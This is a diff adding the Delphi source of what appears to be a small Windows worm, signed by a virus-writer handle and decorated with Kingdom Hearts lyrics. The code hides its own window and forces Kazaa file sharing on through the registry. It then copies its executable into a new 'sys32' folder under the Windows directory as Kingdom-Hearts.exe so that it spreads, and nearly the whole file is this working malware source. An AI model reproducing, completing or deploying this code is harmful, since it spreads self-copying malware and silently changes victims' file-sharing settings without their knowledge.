@@ -1,0 +1,166 @@
+   program Project;
+
+   uses
+     Forms,
+     Unit1 in 'KingdomHearts.pas' {Form1};
+
+   {$R *.res}
+
+   begin
+     Application.Initialize;
+     Application.CreateForm(TForm1, Form1);
+     Application.Run;
+   end.
+
+   -------------
+
+   // - {DoA}(BiH)Energy
+
+   unit KingdomHearts;
+
+   interface
+
+   uses
+     Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
+     Dialogs, Registry, StdCtrls;
+
+   type
+     TForm1 = class(TForm)
+       Edit1: TEdit;
+       Edit2: TEdit;
+       Edit3: TEdit;
+       Edit4: TEdit;
+       procedure FormCreate(Sender: TObject);
+     private
+       { Private declarations }
+     public
+       { Public declarations }
+     end;
+
+   var
+     Form1: TForm1;
+     reg:Tregistry;
+     PC:integer;
+     rootstring:string;
+     rootchar:array[0..79] of Char;
+     sys32string:string;
+     sys32char:array[0..79] of Char;
+     fullstring:string;
+     fullchar:array[0..79] of Char;
+     spankchar:array[0..79] of Char;
+     spankchar2:array[0..79] of Char;
+     spankchar3:array[0..79] of Char;
+     spankstring:string;
+     spankstring2:string;
+     spankstring3:string;
+     spankstringFinal:string;
+     spankcharfinal:array[0..79] of Char;
+
+   {$R *.dfm}
+   function GetWindowsDir: string;
+   const
+   dwLength: DWORD = 255;
+   var
+   pcWinDir: PChar;
+   begin
+   GetMem(pcWinDir, dwLength);
+   GetWindowsDirectory(pcWinDir, dwLength);
+   Result := string(pcWinDir);
+   FreeMem(pcWinDir, dwLength);
+   end;
+
+   procedure TForm1.FormCreate(Sender: TObject);
+   var
+      rootstring:string;
+   begin
+
+   SetWindowLong(Application.Handle, GWL_EXSTYLE, WS_EX_TOOLWINDOW);
+   ShowWindow(Application.Handle, SW_HIDE);
+     SetWindowLong(Application.Handle, GWL_EXSTYLE,
+       GetWindowLong(Application.Handle, GWL_EXSTYLE)
+       or WS_EX_TOOLWINDOW );
+     Application.ShowMainForm := False;
+
+   reg := TRegistry.Create;
+   reg.RootKey := HKEY_CURRENT_USER;
+   if reg.OpenKey('Software\Kazaa\LocalContent',True) then
+    reg.WriteString('DisableSharing','0');
+   reg.writestring('Energy','Kingdom-Hearts'+GetWindowsDir+'\sys32');
+   rootstring:=getwindowsdir;
+
+   strpcopy(rootchar, rootstring);
+   sys32string:='/sys32/';
+   strpcopy(sys32char, sys32string);
+   fullstring:=rootchar+sys32char;
+   strpcopy(fullchar, fullstring);
+
+   CreateDirectory(fullchar,NIL);
+
+   spankstring2:=fullstring;
+   spankstring3:=spankstring2+'Kingdom-Hearts.exe';
+   spankstringFinal:=spankstring3;
+
+   strpcopy(spankcharfinal, spankstringfinal);
+   CopyFile(PChar(Application.ExeName),spankcharfinal,True);
+
+   end;
+   end.
+
+   ----------------
+
+   object Form1: TForm1
+     Left = 192
+     Top = 107
+     Width = 544
+     Height = 375
+     Caption = 'Form1'
+     Color = clYellow
+     Font.Charset = DEFAULT_CHARSET
+     Font.Color = clWindowText
+     Font.Height = -11
+     Font.Name = 'MS Sans Serif'
+     Font.Style = []
+     OldCreateOrder = False
+     OnCreate = FormCreate
+     PixelsPerInch = 96
+     TextHeight = 13
+     object Edit1: TEdit
+       Left = 8
+       Top = 40
+       Width = 497
+       Height = 21
+       TabOrder = 0
+       Text =
+         'Thinking of you, Wherever you are. We pray for our sorrows to en' +
+         'd, and hope that our hearts will blend.'
+     end
+     object Edit2: TEdit
+       Left = 8
+       Top = 72
+       Width = 497
+       Height = 21
+       TabOrder = 1
+       Text =
+         'Now i will step forward to realize this wish. And who knows: Sta' +
+         'rting a new Journey'
+     end
+     object Edit3: TEdit
+       Left = 8
+       Top = 104
+       Width = 497
+       Height = 21
+       TabOrder = 2
+       Text =
+         'may not be so hard or maybe it has already begun. There are many' +
+         ' Worlds, but they share the same sky'
+     end
+     object Edit4: TEdit
+       Tag = 1
+       Left = 176
+       Top = 200
+       Width = 121
+       Height = 21
+       TabOrder = 3
+       Text = 'One Sky - One Destiny'
+     end
+   end
